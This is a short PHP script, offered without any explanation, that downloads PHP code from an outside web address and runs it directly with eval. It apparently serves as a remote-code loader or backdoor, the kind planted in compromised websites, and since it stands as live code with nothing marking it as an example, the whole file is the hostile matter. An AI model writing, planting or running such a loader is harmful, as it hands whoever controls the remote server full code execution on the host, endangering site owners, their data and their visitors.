<?php
$path = "https://code.topkz.ru/fgd/8/x.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
